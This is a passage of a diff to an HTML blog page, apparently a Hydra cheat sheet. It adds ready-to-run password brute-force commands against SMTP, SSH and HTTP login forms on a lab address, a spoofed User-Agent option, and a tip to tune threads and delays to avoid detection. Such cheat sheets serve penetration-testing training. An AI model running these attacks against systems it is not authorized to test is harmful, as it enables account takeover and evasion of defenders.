+<p><strong>Target SMTP Server (Port 25):</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L users.txt -P passwords.txt -s <span style="color:#ae81ff">25</span> 192.168.1.10 smtp
+</span></span></code></pre></div><p><strong>Secure SMTP (Port 465):</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L users.txt -P passwords.txt -s <span style="color:#ae81ff">465</span> 192.168.1.10 smtp -S
+</span></span></code></pre></div><hr>
+<h2 id="-5-advanced-techniques">📌 <strong>5. Advanced Techniques</strong><a hidden class="anchor" aria-hidden="true" href="#-5-advanced-techniques">#</a></h2>
+<h3 id="-session-management">🧠 <strong>Session Management</strong><a hidden class="anchor" aria-hidden="true" href="#-session-management">#</a></h3>
 <ul>
-<li><strong>Session Management</strong>: Use <code>-R</code> to restore interrupted sessions without starting over.</li>
-<li><strong>Efficiency</strong>: Adjust the number of threads with <code>-t</code> to balance speed and server load.</li>
-<li><strong>Verbose Mode</strong>: Use <code>-V</code> to see each login attempt in real-time, useful for troubleshooting.</li>
-<li><strong>Custom Form Parameters</strong>: Understand the target login form structure to craft precise Hydra commands.</li>
+<li><strong>Save Progress and Restore Session:</strong>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L users.txt -P passwords.txt -R 192.168.1.10 ssh
+</span></span></code></pre></div></li>
+<li><strong>Ignore Existing Restore File:</strong>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -I -L users.txt -P passwords.txt 192.168.1.10 ssh
+</span></span></code></pre></div></li>
 </ul>
-<p>&ndash;</p>
+<hr>
+<h3 id="-efficiency-optimization">⚙️ <strong>Efficiency Optimization</strong><a hidden class="anchor" aria-hidden="true" href="#-efficiency-optimization">#</a></h3>
+<ul>
+<li><strong>Adjust Threads:</strong>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -t <span style="color:#ae81ff">64</span> -L users.txt -P passwords.txt 192.168.1.10 ssh
+</span></span></code></pre></div></li>
+<li><strong>Add Delay Between Attempts:</strong>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L users.txt -P passwords.txt -w <span style="color:#ae81ff">1</span> 192.168.1.10 ssh
+</span></span></code></pre></div></li>
+</ul>
+<hr>
+<h3 id="-custom-user-agent-for-http-brute-force">🔒 <strong>Custom User-Agent for HTTP Brute-Force</strong><a hidden class="anchor" aria-hidden="true" href="#-custom-user-agent-for-http-brute-force">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l admin -P passwords.txt 192.168.1.10 http-post-form <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">&#34;/login:username=^USER^&amp;password=^PASS^:F=Incorrect login&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-H <span style="color:#e6db74">&#34;User-Agent: Mozilla/5.0 (Windows NT 10.0)&#34;</span>
+</span></span></code></pre></div><hr>
+<h2 id="-6-output-and-logging">📌 <strong>6. Output and Logging</strong><a hidden class="anchor" aria-hidden="true" href="#-6-output-and-logging">#</a></h2>
+<ul>
+<li><strong>Save Results to a File:</strong>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -L users.txt -P passwords.txt -o results.txt 192.168.1.10 ssh
+</span></span></code></pre></div></li>
+<li><strong>Verbose Output:</strong>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -V -L users.txt -P passwords.txt 192.168.1.10 ssh
+</span></span></code></pre></div></li>
+</ul>
+<hr>
+<h2 id="-7-tips-and-tricks">📌 <strong>7. Tips and Tricks</strong><a hidden class="anchor" aria-hidden="true" href="#-7-tips-and-tricks">#</a></h2>
+<ul>
+<li><strong>Understand Target Forms:</strong> Inspect login forms with browser tools (<code>Inspect Element</code>) to identify fields.</li>
+<li><strong>Use Small Wordlists First:</strong> Start with smaller wordlists for quick checks.</li>
+<li><strong>Don&rsquo;t Overload Targets:</strong> Be mindful of threads (<code>-t</code>) and delays (<code>-w</code>) to avoid detection.</li>
+<li><strong>Handle Captchas &amp; Rate-Limiting:</strong> Some targets may require special handling or custom scripts.</li>
+</ul>
+<hr>
+<h2 id="-8-documentation-and-resources">📌 <strong>8. Documentation and Resources</strong><a hidden class="anchor" aria-hidden="true" href="#-8-documentation-and-resources">#</a></h2>
+<ul>
+<li><strong>Official Hydra GitHub:</strong> <a href="https://github.com/vanhauser-thc/thc-hydra">Hydra GitHub Repository</a></li>
+<li><strong>Hydra Manual:</strong> <code>man hydra</code></li>
+<li><strong>Kali Linux Documentation:</strong> <a href="https://www.kali.org/tools/hydra/">Kali Tools - Hydra</a></li>
+</ul>
+<hr>
 
 
   </div>
@@ -301,6 +572,8 @@ Hydra supports numerous protocols, including:">
     <ul class="post-tags">
       <li><a href="https://nooblogaurus.com/tags/cheat-sheet/">Cheat Sheet</a></li>
       <li><a href="https://nooblogaurus.com/tags/bruteforce/">Bruteforce</a></li>
+      <li><a href="https://nooblogaurus.com/tags/pentesting/">Pentesting</a></li>
+      <li><a href="https://nooblogaurus.com/tags/authentication/">Authentication</a></li>
     </ul>
   </footer>
 </article>
